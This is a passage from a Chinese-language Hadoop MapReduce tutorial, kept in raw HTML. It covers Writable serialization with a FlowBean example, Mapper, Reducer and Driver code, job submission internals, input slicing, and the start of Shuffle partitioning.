class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果系统带有依赖，可以直接打包不用插件的jar包，修改不带依赖的jar包名称为wc.jar，并拷贝该jar包到Hadoop集群的/opt/module/hadoop-3.1.3路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sbin/start-dfs.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"><span class="comment"># 没有依赖的话指定全类名</span></span><br><span class="line">hadoop jar wc.jar com.atguigu.mapreduce.wordcount.WordCountDriver /user/atguigu/input /user/atguigu/output</span><br></pre></td></tr></table></figure><h2 id="2、Hadoop序列化">2、Hadoop序列化</h2><h3 id="2-1-概述">2.1 概述</h3><p><strong>序列化</strong>就是把内存中的对象，转换成字节序列（或其他数据传输协议）以便于存储到磁盘（持久化）和网络传输。<strong>反序列化</strong>就是将收到字节序列（或其他数据传输协议）或者是磁盘的持久化数据，转换成内存中的对象</p><p>一般来说，&quot;活的&quot;对象只生存在内存里，关机断电就没有了。而且对象只能由本地的进程使用，不能被发送到网络上的另外一台计算机。 然而<strong>序列化可以存储&quot;活的&quot;对象，可以将&quot;活的&quot;对象发送到远程计算机</strong>。</p><p>为什么不用Java的序列化？Java的序列化是一个重量级序列化框架（Serializable），一个对象被序列化后，会附带很多额外的信息（各种校验信息，Header，继承体系等），不便于在网络中高效传输。所以，Hadoop自己开发了一套序列化机制（Writable）</p><h3 id="2-2-自定义bean对象实现序列化接口-Writable">2.2 自定义bean对象实现序列化接口(Writable)</h3><p>企业开发中往往常用的基本序列化类型不能满足所有需求，比如在Hadoop框架内部传递一个bean对象，那么该对象就需要实现序列化接口</p><ul><li>必须实现Writable接口</li><li>反序列化时，需要反射调用空参构造函数，所以必须有空参构造</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FlowBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>重写序列化方法和重写反序列化方法，<strong>注意反序列化的顺序和序列化的顺序完全一致</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(DataOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  out.writeLong(upFlow);</span><br><span class="line">  out.writeLong(downFlow);</span><br><span class="line">  out.writeLong(sumFlow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFields</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  upFlow = in.readLong();</span><br><span class="line">  downFlow = in.readLong();</span><br><span class="line">  sumFlow = in.readLong();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>要想把结果显示在文件中，需要重写toString()，可用&quot;\t&quot;分开，方便后续用</li><li>如果需要将自定义的bean放在key中传输，则还需要实现Comparable接口，因为MapReduce框中的Shuffle过程要求对key必须能排序</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(FlowBean o)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 倒序排列，从大到小</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.sumFlow &gt; o.getSumFlow() ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-序列化案例实操">2.3 序列化案例实操</h3><p>数据格式如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1  13736230513  192.196.100.1  www.atguigu.com  2481  24681  200</span><br><span class="line">2  13846544121  192.196.100.2      264  0  200</span><br><span class="line">3   13956435636  192.196.100.3      132  1512  200</span><br><span class="line">4   13966251146  192.168.100.1      240  0  404</span><br><span class="line">5   18271575951  192.168.100.2  www.atguigu.com  1527  2106  200</span><br><span class="line">6   84188413  192.168.100.3  www.atguigu.com  4116  1432  200</span><br><span class="line">7   13590439668  192.168.100.4      1116  954  200</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251330914.png" alt></p><p>创建包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1 继承 Writable 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowBean</span> <span class="keyword">implements</span> <span class="title">Writable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> upFlow; <span class="comment">//上行流量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> downFlow; <span class="comment">//下行流量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> sumFlow; <span class="comment">//总流量</span></span><br><span class="line">    <span class="comment">//2 提供无参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FlowBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 提供三个参数的 getter 和 setter 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getUpFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpFlow</span><span class="params">(<span class="keyword">long</span> upFlow)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upFlow = upFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getDownFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> downFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDownFlow</span><span class="params">(<span class="keyword">long</span> downFlow)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.downFlow = downFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSumFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSumFlow</span><span class="params">(<span class="keyword">long</span> sumFlow)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sumFlow = sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSumFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sumFlow = <span class="keyword">this</span>.upFlow + <span class="keyword">this</span>.downFlow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//4 实现序列化和反序列化方法,注意顺序一定要保持一致</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        dataOutput.writeLong(upFlow);</span><br><span class="line">        dataOutput.writeLong(downFlow);</span><br><span class="line">        dataOutput.writeLong(sumFlow);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upFlow = dataInput.readLong();</span><br><span class="line">        <span class="keyword">this</span>.downFlow = dataInput.readLong();</span><br><span class="line">        <span class="keyword">this</span>.sumFlow = dataInput.readLong();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//5 重写 ToString</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upFlow + <span class="string">"\t"</span> + downFlow + <span class="string">"\t"</span> + sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Mapper类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">FlowBean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Text outK = <span class="keyword">new</span> Text();</span><br><span class="line">    <span class="keyword">private</span> FlowBean outV = <span class="keyword">new</span> FlowBean();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1 获取一行数据,转成字符串</span></span><br><span class="line">        String line = value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 切割数据</span></span><br><span class="line">        String[] split = line.split(<span class="string">"\t"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 抓取我们需要的数据:手机号,上行流量,下行流量</span></span><br><span class="line">        String phone = split[<span class="number">1</span>];</span><br><span class="line">        String up = split[split.length - <span class="number">3</span>];</span><br><span class="line">        String down = split[split.length - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 封装outK outV</span></span><br><span class="line">        outK.set(phone);</span><br><span class="line"></span><br><span class="line">        outV.setUpFlow(Long.parseLong(up));</span><br><span class="line">        outV.setDownFlow(Long.parseLong(down));</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5 写出outK outV</span></span><br><span class="line">        context.write(outK, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Reducer类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">FlowBean</span>, <span class="title">Text</span>, <span class="title">FlowBean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> FlowBean outV = <span class="keyword">new</span> FlowBean();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;FlowBean&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> totalUp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> totalDown = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1 遍历values,将其中的上行流量,下行流量分别累加</span></span><br><span class="line">        <span class="keyword">for</span> (FlowBean flowBean : values) &#123;</span><br><span class="line">            totalUp += flowBean.getUpFlow();</span><br><span class="line">            totalDown += flowBean.getDownFlow();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 封装outKV</span></span><br><span class="line">        outV.setUpFlow(totalUp);</span><br><span class="line">        outV.setDownFlow(totalDown);</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 写出outK outV</span></span><br><span class="line">        context.write(key,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Driver驱动类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowDriver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1 获取job对象</span></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 关联本Driver类</span></span><br><span class="line">        job.setJarByClass(FlowDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 关联Mapper和Reducer</span></span><br><span class="line">        job.setMapperClass(FlowMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setReducerClass(FlowReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4 设置Map端输出KV类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(FlowBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//5 设置程序最终输出的KV类型</span></span><br><span class="line">        job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(FlowBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//6 设置程序的输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(<span class="string">"D:\\inputflow"</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(<span class="string">"D:\\flowoutput"</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//7 提交Job</span></span><br><span class="line">        <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、MapReduce框架原理">3、MapReduce框架原理</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251330915.png" alt></p><h3 id="3-1-InputFormat数据输入">3.1 InputFormat数据输入</h3><p>切片与MapTask并行度决定机制：MapTask的并行度决定Map阶段任务处理并发度，进而影响到整个job的处理速度。数据块（block）是物理上把数据分成一块一块的，数据块是HDFS数据存储单位。</p><p>数据切片只是在逻辑上对输入数据进行分片，数据切片是MapReduce程序计算输入数据的单位。一个切片会对应启动一个MapTask。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330916.png" alt></p><p><strong>Job提交流程源码详解</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">waitForCompletion()</span><br><span class="line"></span><br><span class="line">submit();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1建立连接</span></span><br><span class="line">  connect();  </span><br><span class="line">    <span class="comment">// 1）创建提交Job的代理</span></span><br><span class="line">    <span class="keyword">new</span> Cluster(getConfiguration());</span><br><span class="line">      <span class="comment">// （1）判断是本地运行环境还是yarn集群运行环境</span></span><br><span class="line">      initialize(jobTrackAddr, conf); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 提交job</span></span><br><span class="line">submitter.submitJobInternal(Job.<span class="keyword">this</span>, cluster)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1）创建给集群提交数据的Stag路径</span></span><br><span class="line">  Path jobStagingArea = JobSubmissionFiles.getStagingDir(cluster, conf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2）获取jobid ，并创建Job路径</span></span><br><span class="line">  JobID jobId = submitClient.getNewJobID();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3）拷贝jar包到集群</span></span><br><span class="line">copyAndConfigureFiles(job, submitJobDir);  </span><br><span class="line">  rUploader.uploadFiles(job, jobSubmitDir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4）计算切片，生成切片规划文件</span></span><br><span class="line">writeSplits(job, submitJobDir);</span><br><span class="line">    maps = writeNewSplits(job, jobSubmitDir);</span><br><span class="line">    input.getSplits(job);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5）向Stag路径写XML配置文件</span></span><br><span class="line">writeConf(conf, submitJobFile);</span><br><span class="line">  conf.writeXml(out);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 6）提交Job,返回提交状态</span></span><br><span class="line">status = submitClient.submitJob(jobId, submitJobDir.toString(), job.getCredentials());</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251330917.png" alt></p><p><strong>FileInputFormat切片源码解析(input.getSplits(job)****)</strong></p><p>注意这里小于1.1倍名义上是切成一块，其实存储还是两块，只是把小的那部分通过网络拉取过来形成一块处理</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330918.png" alt></p><ul><li>简单地按照文件的内容长度进行切片</li><li>切片大小，默认等于Block大小</li><li><strong>切片时不考虑数据集整体，而是逐个针对每一个文件单独切片</strong></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330919.png" alt></p><p><strong>TextInputFormat实现类</strong></p><blockquote><p>FileInputFormat常见的接口实现类包括：TextInputFormat、KeyValueTextInputFormat、NLineInputFormat、CombineTextInputFormat和自定义InputFormat等</p></blockquote><p>TextInputFormat是默认的FileInputFormat实现类。按行读取每条记录。键是存储该行在整个文件中的起始字节偏移量， LongWritable类型。值是这行的内容，不包括任何行终止符（换行符和回车符），Text类型</p><p><strong>CombineTextInputFormat实现类</strong></p><blockquote><p>框架默认的TextInputFormat切片机制是对任务按文件规划切片，不管文件多小，都会是一个单独的切片，都会交给一个MapTask，这样如果有大量小文件，就会产生大量的MapTask，处理效率极其低下</p></blockquote><p>CombineTextInputFormat用于小文件过多的场景，它可以将多个小文件从逻辑上规划到一个切片中，这样，多个小文件就可以交给一个MapTask处理</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330920.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先准备四个小文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不做任何处理，输出切片为4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//驱动类中添加代码如下</span></span><br><span class="line"><span class="comment">//输出为3</span></span><br><span class="line"><span class="comment">// 如果不设置 InputFormat，它默认用的是 TextInputFormat.class</span></span><br><span class="line">job.setInputFormatClass(CombineTextInputFormat<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//虚拟存储切片最大值设置 4m</span></span><br><span class="line">CombineTextInputFormat.setMaxInputSplitSize(job, <span class="number">4194304</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出为1</span></span><br><span class="line"><span class="comment">// 如果不设置 InputFormat，它默认用的是 TextInputFormat.class</span></span><br><span class="line">job.setInputFormatClass(CombineTextInputFormat<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//虚拟存储切片最大值设置 20m</span></span><br><span class="line">CombineTextInputFormat.setMaxInputSplitSize(job, <span class="number">20971520</span>);</span><br></pre></td></tr></table></figure><h3 id="3-2-MapReduce工作流程">3.2 MapReduce工作流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330921.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330922.png" alt></p><h3 id="3-3-Shuffle机制">3.3 Shuffle机制</h3><blockquote><p>Map方法之后，Reduce方法之前的数据处理过程称之为Shuffle</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202401251330923.png" alt></p><p><strong>Shuffle分区</strong></p><ul><li>如果ReduceTask的数量&gt; getPartition的结果数，则会多产生几个空的输出文件part-r-000xx；</li><li>如果1&lt;ReduceTask的数量&lt;getPartition的结果数，则有一部分分区数据无处安放，会Exception；</li><li>如果ReduceTask的数量=1，则不管MapTask端输出多少个分区文件，最终结果都交给这一个ReduceTask，最终也就只会产生一个结果文件 part-r-00000；</li><li>分区号必须从零开始，逐一累加。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Partition分区案例实操</span></span><br><span class="line"><span 